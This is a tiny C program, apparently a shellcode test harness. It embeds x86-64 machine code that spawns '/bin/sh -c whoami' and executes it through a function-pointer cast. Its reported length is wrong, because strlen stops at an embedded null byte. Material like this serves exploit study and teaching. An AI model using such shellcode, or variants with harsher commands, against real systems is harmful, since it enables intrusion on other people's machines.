#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
"\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x07\x00\x00\x00\x77"
"\x68\x6f\x61\x6d\x69\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
"\x05";


main() {

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}

